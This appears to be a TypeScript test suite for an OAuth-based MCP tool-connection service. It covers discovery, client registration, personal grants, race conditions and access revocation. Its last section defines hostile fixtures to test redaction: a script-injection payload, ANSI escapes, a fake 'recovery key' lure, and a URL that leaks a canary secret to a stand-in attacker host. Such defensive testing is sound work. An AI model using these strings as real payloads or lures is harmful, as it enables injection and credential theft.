    // RFC 8707: the MCP server is named so the token can be audience-restricted.
    expect(authorizationUrl.searchParams.get("resource")).toBe(MCP_URL);

    const [afterStart] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    expect(afterStart!.authKind).toBe("oauth");
    expect(afterStart!.config).toMatchObject({
      oauth: { issuer: ISSUER, expectedIssuer: ISSUER, resource: MCP_URL, clientRegistrationSource: "dcr" },
    });

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    const completed = await service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    // Same catalog/review pipeline a curated connection gets.
    expect(completed.actions.readOnly.map((action) => action.toolName)).toEqual(["list_insights"]);
    expect(completed.actions.canMakeChanges.map((action) => action.toolName)).toEqual(["create_insight"]);

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("resource")).toBe(MCP_URL);
    expect((tokenRequest.body as URLSearchParams).get("code_verifier")).toBeTruthy();

    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    expect(connection).toMatchObject({ status: "active", enabled: true, authKind: "oauth" });
    // The access token lives in a secret, never in the config JSON.
    expect(JSON.stringify(connection!.config)).not.toContain("fixture-access-");
    expect(connection!.credentialSecretRefs.map((ref) => ref.configPath).sort())
      .toEqual(["oauth.access_token", "oauth.refresh_token"]);
  });

  it("discovers OAuth for a personal URL connection before its user grant exists", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const app = createRouteApp(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        link: MCP_URL,
        name: "Fixture personal OAuth",
        grantKind: "user",
      });
    expect(response.status, JSON.stringify(response.body)).toBe(201);
    const connected = response.body;

    expect(connected.auth).toMatchObject({
      kind: "oauth",
      issuer: ISSUER,
      resource: MCP_URL,
      startUrl: expect.any(String),
    });
    expect(fixture.requestsTo("/mcp")[0]!.headers.authorization).toBeUndefined();
    await expect(
      db
        .select()
        .from(connectionGrants)
        .where(eq(connectionGrants.connectionId, connected.connectionId)),
    ).resolves.toHaveLength(0);

    const authorizationUrl = new URL(connected.auth.startUrl);
    const code = fixture.issueAuthorizationCode(connected.auth.startUrl);
    await request(app)
      .get("/api/tools/oauth/callback")
      .set("Accept", "text/html")
      .query({ state: authorizationUrl.searchParams.get("state")!, code, iss: ISSUER })
      .expect(303);

    const grants = await db
      .select()
      .from(connectionGrants)
      .where(eq(connectionGrants.connectionId, connected.connectionId));
    expect(grants).toEqual([
      expect.objectContaining({
        kind: "user",
        subjectUserId: actor.actorId,
        status: "active",
      }),
    ]);
  });

  it("does not let another user take over an archived personal URL connection", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const input = { link: MCP_URL, name: "Archived personal URL", grantKind: "user" as const };
    const first = await service.connectGalleryApp(company.id, input, { actorType: "user", actorId: "board-user" });
    await db.update(toolConnections).set({ status: "archived" }).where(eq(toolConnections.id, first.connectionId));
    await db.update(toolApplications).set({ status: "archived" }).where(eq(toolApplications.id, first.application.id));
    await db.insert(companyMemberships).values({
      companyId: company.id, principalType: "user", principalId: "other-user", status: "active", membershipRole: "admin",
    });
    fixture.fetchMock.mockClear();

    await expect(service.connectGalleryApp(company.id, input, {
      actorType: "user", actorId: "other-user",
    })).rejects.toMatchObject({ status: 403, message: "Only the existing personal identity can reconnect this connection" });

    expect(fixture.fetchMock).not.toHaveBeenCalled();
    await expect(db.select().from(connectionGrants)).resolves.toHaveLength(0);
    await expect(service.getConnection(first.connectionId)).resolves.toMatchObject({
      status: "archived", createdByUserId: "board-user",
    });
    const resumed = await service.connectGalleryApp(company.id, input, { actorType: "user", actorId: "board-user" });
    expect(resumed.connectionId).toBe(first.connectionId);
    expect(resumed.auth).toMatchObject({ kind: "oauth" });
  });

  it("creates one personal grant when two public URL setup retries probe concurrently", async () => {
    const fixture = installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const first = await service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Concurrent personal URL", grantKind: "user",
    }, actor);
    await service.connectGalleryApp(company.id, {
      link: MCP_URL, grantKind: "user", resumeConnectionId: first.connectionId,
    }, actor);
    // Model an interrupted draft with catalog/defaults but no personal grant.
    // This isolates the grant race from first-time catalog/profile insertion.
    await db.delete(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId));
    await db.delete(toolAccessAuditEvents).where(eq(toolAccessAuditEvents.connectionId, first.connectionId));
    fixture.fetchMock.mockRestore();
    let probes = 0;
    let release!: () => void;
    const bothProbed = new Promise<void>((resolve) => { release = resolve; });
    vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
      probes += 1;
      if (probes === 2) release();
      await bothProbed;
      return jsonResponse({ jsonrpc: "2.0", id: "paperclip-catalog-refresh", result: { tools: FIXTURE_TOOLS } });
    });

    const results = await Promise.allSettled([0, 1].map(() => service.connectGalleryApp(company.id, {
      link: MCP_URL, grantKind: "user", resumeConnectionId: first.connectionId,
    }, actor)));

    for (const result of results) {
      if (result.status === "rejected") throw result.reason;
    }
    expect(results.map((result) => result.status)).toEqual(["fulfilled", "fulfilled"]);
    await expect(db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId)))
      .resolves.toEqual([expect.objectContaining({ kind: "user", subjectUserId: actor.actorId, status: "active", credentialSecretRefs: [] })]);
    await expect(db.select().from(toolAccessAuditEvents).where(and(
      eq(toolAccessAuditEvents.connectionId, first.connectionId),
      eq(toolAccessAuditEvents.action, "connection_grant.created"),
    ))).resolves.toHaveLength(1);
  });

  it("keeps a successful personal setup when the grant-creating retry later fails", async () => {
    const fixture = installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const first = await service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Personal retry rollback", grantKind: "user",
    }, actor);
    const retryInput = { link: MCP_URL, grantKind: "user" as const, resumeConnectionId: first.connectionId };
    await service.connectGalleryApp(company.id, retryInput, actor);
    await db.delete(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId));
    await db.update(toolConnections).set({ status: "archived" }).where(eq(toolConnections.id, first.connectionId));
    await db.update(toolApplications).set({ status: "archived", archivedAt: new Date() }).where(eq(toolApplications.id, first.application.id));
    fixture.fetchMock.mockRestore();
    let calls = 0;
    let catalogStarted!: () => void;
    const catalogPending = new Promise<void>((resolve) => { catalogStarted = resolve; });
    let failCatalog!: () => void;
    const releaseCatalog = new Promise<void>((resolve) => { failCatalog = resolve; });
    vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
      calls += 1;
      if (calls === 2) {
        // The first retry has created its grant but has not finished setup.
        catalogStarted();
        await releaseCatalog;
        throw new Error("first retry catalog unavailable");
      }
      return jsonResponse({ jsonrpc: "2.0", id: "paperclip-catalog-refresh", result: { tools: FIXTURE_TOOLS } });
    });
    const failure = service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Personal retry rollback", grantKind: "user",
    }, actor).then(() => null, (error: unknown) => error);
    await Promise.race([catalogPending, failure.then((error) => { throw error ?? new Error("Retry finished before the catalog probe"); })]);
    try {
      const successfulRetry = await service.connectGalleryApp(company.id, retryInput, actor);
      expect(successfulRetry.connectionId).toBe(first.connectionId);
    } finally {
      failCatalog();
    }
    expect(await failure).toMatchObject({ status: 502 });
    await expect(db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId)))
      .resolves.toEqual([expect.objectContaining({ kind: "user", subjectUserId: actor.actorId, status: "active", credentialSecretRefs: [] })]);
    await expect(service.getConnection(first.connectionId)).resolves.toMatchObject({ status: "draft", credentialPolicy: "per_user" });
    const [application] = await db.select().from(toolApplications).where(eq(toolApplications.id, first.application.id));
    expect(application.status).toBe("draft");
    await expect(service.checkHealth(first.connectionId, actor)).resolves.toMatchObject({ connection: { healthStatus: "ok" } });
  });

  it("rolls back partial catalog and profile writes without removing the established public identity", async () => {
    const fixture = installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const input = { link: MCP_URL, name: "Personal atomic catalog", grantKind: "user" as const };
    const first = await service.connectGalleryApp(company.id, input, actor);
    const catalogBefore = await db.select().from(toolCatalogEntries).where(eq(toolCatalogEntries.connectionId, first.connectionId));
    await db.delete(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId));
    await db.update(toolConnections).set({ status: "archived" }).where(eq(toolConnections.id, first.connectionId));
    await db.update(toolApplications).set({ status: "archived", archivedAt: new Date() }).where(eq(toolApplications.id, first.application.id));
    fixture.fetchMock.mockRestore();
    vi.spyOn(globalThis, "fetch").mockImplementation(async () => jsonResponse({
      jsonrpc: "2.0", id: "paperclip-catalog-refresh",
      result: { tools: [...FIXTURE_TOOLS, { name: "new_tool", description: "Partial catalog addition" }] },
    }));
    await db.execute(sql`
      CREATE FUNCTION test_personal_profile_failure() RETURNS trigger LANGUAGE plpgsql AS $$
      BEGIN RAISE EXCEPTION 'personal profile fixture failure'; END $$
    `);
    await db.execute(sql`
      CREATE TRIGGER test_personal_profile_failure BEFORE INSERT ON tool_profile_entries
      FOR EACH ROW EXECUTE FUNCTION test_personal_profile_failure()
    `);
    try {
      await expect(service.connectGalleryApp(company.id, input, actor)).rejects.toThrow();
      await expect(db.select().from(toolCatalogEntries).where(eq(toolCatalogEntries.connectionId, first.connectionId)))
        .resolves.toEqual(catalogBefore);
      await expect(db.select().from(toolProfiles).where(eq(toolProfiles.companyId, company.id))).resolves.toHaveLength(0);
      await expect(db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).resolves.toHaveLength(0);
      await expect(db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId)))
        .resolves.toEqual([expect.objectContaining({ kind: "user", status: "active", credentialSecretRefs: [] })]);
      await expect(service.getConnection(first.connectionId)).resolves.toMatchObject({ status: "draft", credentialPolicy: "per_user" });
    } finally {
      await db.execute(sql`DROP TRIGGER test_personal_profile_failure ON tool_profile_entries`);
      await db.execute(sql`DROP FUNCTION test_personal_profile_failure()`);
    }
    const retry = await service.connectGalleryApp(company.id, { ...input, resumeConnectionId: first.connectionId }, actor);
    expect(retry.catalog).toHaveLength(3);
    await expect(db.select().from(toolProfiles).where(eq(toolProfiles.companyId, company.id))).resolves.toHaveLength(1);
    await expect(db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).resolves.toHaveLength(1);
  });

  it("creates an empty user grant after a personal public URL probe succeeds", async () => {
    // Use a real loopback MCP server here: neither fetch nor the transport is mocked.
    const receivedMethods: string[] = [];
    const mcpServer = createServer(async (req, res) => {
      const chunks: Buffer[] = [];
      for await (const chunk of req) chunks.push(Buffer.from(chunk));
      const body = JSON.parse(Buffer.concat(chunks).toString("utf8"));
      receivedMethods.push(body.method);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ jsonrpc: "2.0", id: body.id, result: { tools: FIXTURE_TOOLS } }));
    });
    mcpServer.listen(0, "127.0.0.1");
    await once(mcpServer, "listening");
    const address = mcpServer.address();
    if (!address || typeof address === "string") throw new Error("Missing MCP fixture port");
    try {
      const company = await createCompany(db);
      const app = createRouteApp(db, {
        deploymentMode: "local_trusted",
        deploymentExposure: "private",
      });
      const actor = { actorType: "user" as const, actorId: "board-user" };

      const response = await request(app)
        .post(`/api/companies/${company.id}/tools/apps/connect`)
        .send({
          link: `http://127.0.0.1:${address.port}/mcp`,
          name: "Fixture personal public",
          grantKind: "user",
        });
      expect(response.status, JSON.stringify(response.body)).toBe(201);
      const connected = response.body;
      expect(receivedMethods).toContain("tools/list");

      expect(connected.connection).toMatchObject({
        status: "draft",
        credentialPolicy: "per_user",
      });
      expect(connected.catalog.map((entry: { toolName: string }) => entry.toolName).sort()).toEqual([
        "create_insight",
        "list_insights",
      ]);
      await expect(
        db
          .select()
          .from(connectionGrants)
          .where(eq(connectionGrants.connectionId, connected.connectionId)),
      ).resolves.toEqual([
        expect.objectContaining({
          kind: "user",
          subjectUserId: actor.actorId,
          credentialSecretRefs: [],
          status: "active",
        }),
      ]);
    } finally {
      await new Promise<void>((resolve, reject) => {
        mcpServer.close((error) => error ? reject(error) : resolve());
        mcpServer.closeAllConnections();
      });
    }
  });

  it("completes organization OAuth with a single database connection", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const callbackDb = createDb(tempDb!.connectionString, { maxConnections: 1 });
    const service = toolAccessService(callbackDb);
    let deadline: ReturnType<typeof setTimeout> | null = null;

    try {
      await callbackDb.execute(sql`select pg_backend_pid()`);
      const connected = await service.connectGalleryApp(company.id, {
        link: MCP_URL,
        name: "Fixture single-pool OAuth",
      });
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      });
      const authorizationUrl = new URL(start.authorizationUrl);
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      const completed = await Promise.race([
        service.completeOAuthCallback({
          state: authorizationUrl.searchParams.get("state")!,
          code,
          iss: ISSUER,
          redirectUri: REDIRECT_URI,
          actor: { actorType: "user", actorId: "board-user" },
        }),
        new Promise<never>((_resolve, reject) => {
          deadline = setTimeout(() => {
            void callbackDb.$client.end({ timeout: 0 })
              .finally(() => reject(new Error("OAuth callback self-deadlocked with maxConnections=1")));
          }, 5_000);
        }),
      ]);

      expect(completed.connection).toMatchObject({ status: "active", enabled: true });
    } finally {
      if (deadline) clearTimeout(deadline);
      await callbackDb.$client.end({ timeout: 0 }).catch(() => undefined);
    }
  }, 15_000);

  it("rejects organization OAuth completion after the initiating user loses write access", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture revoked organization OAuth",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    await db
      .update(companyMemberships)
      .set({ membershipRole: "viewer" })
      .where(eq(companyMemberships.companyId, company.id));

    const authorizationUrl = new URL(start.authorizationUrl);
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await expect(service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor,
    })).rejects.toMatchObject({
      status: 403,
      message: expect.stringContaining("membership no longer permits connection changes"),
    });

    const [connection] = await db
      .select()
      .from(toolConnections)
      .where(eq(toolConnections.id, connected.connectionId));
    expect(connection).toMatchObject({ status: "draft" });
    expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.access_token")).toBe(false);
    expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.refresh_token")).toBe(false);
  });

  it("serializes organization OAuth completion behind membership revocation", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const callbackDb = createDb(tempDb!.connectionString, { maxConnections: 1 });
    const removalDb = createDb(tempDb!.connectionString, { maxConnections: 1 });
    const service = toolAccessService(callbackDb);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    let releaseRemoval!: () => void;
    const removalMayCommit = new Promise<void>((resolve) => {
      releaseRemoval = resolve;
    });
    let membershipLocked!: () => void;
    const membershipIsLocked = new Promise<void>((resolve) => {
      membershipLocked = resolve;
    });

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture concurrent revocation OAuth",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    const authorizationUrl = new URL(start.authorizationUrl);
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    const beforeSecrets = await db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id));
    const beforeVersions = await db.select().from(companySecretVersions);
    const beforeBindings = await db.select().from(companySecretBindings).where(eq(companySecretBindings.companyId, company.id));
    const beforeGrants = await db.select().from(connectionGrants).where(and(
      eq(connectionGrants.companyId, company.id),
      eq(connectionGrants.connectionId, connected.connectionId),
    ));

    const removal = removalDb.transaction(async (tx) => {
      await tx.select({ id: companyMemberships.id }).from(companyMemberships).where(and(
        eq(companyMemberships.companyId, company.id),
        eq(companyMemberships.principalType, "user"),
        eq(companyMemberships.principalId, "board-user"),
      )).for("update");
      membershipLocked();
      await removalMayCommit;
      await tx.update(companyMemberships).set({
        membershipRole: "viewer",
        updatedAt: new Date(),
      }).where(and(
        eq(companyMemberships.companyId, company.id),
        eq(companyMemberships.principalType, "user"),
        eq(companyMemberships.principalId, "board-user"),
      ));
    });

    await membershipIsLocked;
    const completion = service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor,
    }).then(
      (value) => ({ value, error: null }),
      (error: unknown) => ({ value: null, error }),
    );

    try {
      expect(await waitForBlockedMembershipUpdate()).toBe(true);
      releaseRemoval();
      await removal;
      const outcome = await completion;
      expect(outcome.value).toBeNull();
      expect(outcome.error).toMatchObject({
        status: 403,
        message: expect.stringContaining("membership no longer permits connection changes"),
      });

      const [connection] = await db.select().from(toolConnections).where(eq(
        toolConnections.id,
        connected.connectionId,
      ));
      expect(connection).toMatchObject({ status: "draft" });
      expect(connection!.credentialSecretRefs).toEqual([]);
      await expect(db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id)))
        .resolves.toHaveLength(beforeSecrets.length);
      await expect(db.select().from(companySecretVersions)).resolves.toHaveLength(beforeVersions.length);
      await expect(db.select().from(companySecretBindings).where(eq(companySecretBindings.companyId, company.id)))
        .resolves.toHaveLength(beforeBindings.length);
      const afterGrants = await db.select().from(connectionGrants).where(and(
        eq(connectionGrants.companyId, company.id),
        eq(connectionGrants.connectionId, connected.connectionId),
      ));
      expect(afterGrants).toEqual(beforeGrants);
    } finally {
      releaseRemoval();
      await removal.catch(() => undefined);
      await callbackDb.$client.end({ timeout: 0 }).catch(() => undefined);
      await removalDb.$client.end({ timeout: 0 }).catch(() => undefined);
    }
  }, 15_000);

  it("discovers a pathful issuer through the OIDC suffix form too", async () => {
    installMcpOAuthFixture({ auth: "oauth", wellKnownStyle: "oidc-suffix" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture suffix" });
    expect(connected.auth).toMatchObject({ kind: "oauth", issuer: ISSUER });
  });

  it("prefers a Client ID Metadata Document over dynamic registration", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    const service = toolAccessService(db, {
      oauthClientMetadataLookup: async () => [{ address: "93.184.216.34", family: 4 }],
    });

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture CIMD" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("cimd");
    // The client_id *is* the document URL, so nothing was registered.
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe(CLIENT_METADATA_DOCUMENT_URL);
    expect(fixture.requestsTo("/register")).toHaveLength(0);
  });

  it("replaces a private-only Client ID Metadata Document with dynamic registration", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      cimd: true,
      registrationExtraRedirectUris: [`${ISSUER}/oauth/callback/`],
    });
    const company = await createCompany(db);
    let metadataAddress = "93.184.216.34";
    const service = toolAccessService(db, {
      oauthClientMetadataLookup: async () => [{ address: metadataAddress, family: 4 }],
    });

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture private CIMD" });
    const firstStart = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://paperclip.tailnet.test:42001/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(firstStart.registrationSource).toBe("cimd");

    // A private DNS answer models a Tailscale/MagicDNS callback. The first start
    // also proves retry migration: a connection that persisted the now-unusable
    // CIMD client id must not keep presenting it forever.
    metadataAddress = "100.100.100.100";
    const retry = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://paperclip.tailnet.test:42001/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(retry.registrationSource).toBe("dcr");
    expect(new URL(retry.authorizationUrl).searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
  });

  it("falls back to dynamic registration when the callback is not public HTTPS", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture local CIMD" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      // A loopback callback cannot serve a client_id an authorization server can
      // fetch, so CIMD is unavailable and DCR has to carry the flow.
      redirectUri: "http://localhost:3100/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("dcr");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
  });

  it("prefers a deployment-preconfigured client over any registration", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    vi.stubEnv("PAPERCLIP_TOOL_OAUTH_CLIENT_ID", "preconfigured-client");
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture preconfigured" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("preconfigured");
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe("preconfigured-client");
    expect(fixture.requestsTo("/register")).toHaveLength(0);
  });

  it("asks for a preregistered client when the server offers neither CIMD nor DCR", async () => {
    installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    const app = createRouteApp(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: MCP_URL, name: "Fixture manual" })
      .expect(201);

    // The draft connection is real; only the client is missing. Losing the draft
    // here would make the operator start over just to paste a client id.
    expect(response.body.auth).toMatchObject({ kind: "oauth", startUrl: null, manualClientRequired: true });
    await expect(db.select().from(toolConnections)).resolves.toHaveLength(1);
  });

  it("uses preregistered client credentials without registering anything", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual client",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("manual");
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe("operator-client");
    expect(fixture.requestsTo("/register")).toHaveLength(0);

    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    // The client secret is a secret ref, and specifically *not* a credential ref:
    // it goes to the token endpoint, never onto an MCP request as a header.
    expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.client_secret")).toBe(true);
    expect(connection!.credentialRefs.some((ref) => ref.name === "oauth.client_secret")).toBe(false);
    expect(JSON.stringify(connection!.config)).not.toContain("operator-secret");

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBe("operator-secret");
  });

  it("uses a preregistered client secret stored on a personal user grant", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    await db
      .update(companyMemberships)
      .set({ membershipRole: "owner" })
      .where(eq(companyMemberships.companyId, company.id));
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture personal manual client",
      authMode: "oauth",
      grantKind: "user",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    }, { actorType: "user", actorId: "board-user" });
    const [storedConnection] = await db.select().from(toolConnections)
      .where(eq(toolConnections.id, connected.connectionId));
    expect(storedConnection!.credentialPolicy).toBe("per_user");
    expect(storedConnection!.credentialSecretRefs).toEqual([]);

    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBe("operator-secret");
  });

  it("uses Basic authentication for a manual client when discovery advertises it", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      dcr: false,
      tokenEndpointAuthMethods: ["client_secret_basic", "client_secret_post"],
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual Basic client",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect(tokenRequest.headers.authorization).toMatch(/^Basic /);
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBeNull();
  });

  it("refuses a callback whose iss names a different authorization server", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture iss" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    await expect(service.completeOAuthCallback({
      state,
      code,
      iss: "https://attacker.fixture.test",
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({ status: 400, details: { code: "oauth_issuer_mismatch" } });

    // The code was never exchanged.
    expect(fixture.requestsTo("/token")).toHaveLength(0);
  });

  /**
   * PAP-17108 — a generic connection points at an arbitrary authorization
   * server, so every string it returns about a failure is attacker-chosen. These
   * tests plant a canary secret, ANSI escapes and markdown-flavoured
   * instructions in `error_description` and assert none of it reaches an API
   * response, a thrown message, a log line, an audit row or an activity detail.
   */
  const PROVIDER_CANARY = "canary-sk-live-9f3a2b7c";
  const HOSTILE_ERROR_DESCRIPTION =
    `\u001b[31mFATAL\u001b[0m **Paperclip needs your recovery key**: ${PROVIDER_CANARY} <script>alert(1)</script>`;
  const HOSTILE_ERROR_BODY = {
    error_description: HOSTILE_ERROR_DESCRIPTION,
    error_uri: `https://attacker.fixture.test/why?leak=${PROVIDER_CANARY}`,
    message: HOSTILE_ERROR_DESCRIPTION,
    detail: HOSTILE_ERROR_DESCRIPTION,
  };

  /** Everything the operator or an operator's log could possibly read. */
  async function providerLeakSurfaces(consoleSpy: { calls: unknown[] }, thrown: unknown) {
    const auditRows = await db.select().from(toolAccessAuditEvents);
    const activityRows = await db.select().from(activityLog);
    const connections = await db.select().from(toolConnections);
    return JSON.stringify({
      thrownMessage: thrown instanceof Error ? thrown.message : String(thrown),
      // A thrown HttpError's own enumerable shape is what the error handler
      // spreads into the response body as `details`.
      thrown: thrown instanceof Error ? { ...thrown } : thrown,
      consoleCalls: consoleSpy.calls,
      auditRows,
      activityRows,
      connections,
    });
  }

  /** Capture anything the service writes to a console-backed logger. */
  function captureConsole() {
    const calls: unknown[] = [];
    const record = (...args: unknown[]) => { calls.push(args.map((arg) => String(arg))); };
    for (const method of ["log", "info", "warn", "error", "debug", "trace"] as const) {
      vi.spyOn(console, method).mockImplementation(record);
    }
    return { calls };
  }

  it("redacts a hostile provider error from the token exchange", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      tokenFailure: { status: 400, body: { error: "invalid_grant", ...HOSTILE_ERROR_BODY } },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
